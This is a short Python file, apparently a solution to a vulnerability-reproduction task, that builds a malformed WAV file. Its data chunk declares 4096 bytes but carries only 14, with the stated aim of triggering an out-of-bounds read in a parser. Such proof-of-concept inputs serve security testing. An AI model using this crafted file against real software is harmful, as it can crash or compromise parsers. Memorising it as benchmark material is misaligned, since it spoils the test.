import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        riff = b'RIFF'
        total_size = 58 - 8  # RIFF chunk size excludes 'RIFF' and size field
        wave = b'WAVE'
        fmt_chunk_id = b'fmt '
        fmt_chunk_size = 16
        audio_format = 1  # PCM
        num_channels = 1
        sample_rate = 8000
        bits_per_sample = 8
        byte_rate = sample_rate * num_channels * (bits_per_sample // 8)
        block_align = num_channels * (bits_per_sample // 8)

        data_chunk_id = b'data'
        # Intentionally oversized data chunk to trigger OOB read vs RIFF end
        data_chunk_size = 4096
        actual_data = b'\x00' * 14  # Actual bytes present, less than declared size

        header = (
            riff +
            struct.pack('<I', total_size) +
            wave +
            fmt_chunk_id +
            struct.pack('<IHHIIHH',
                        fmt_chunk_size,
                        audio_format,
                        num_channels,
                        sample_rate,
                        byte_rate,
                        block_align,
                        bits_per_sample) +
            data_chunk_id +
            struct.pack('<I', data_chunk_size)
        )

        poc = header + actual_data
        return poc
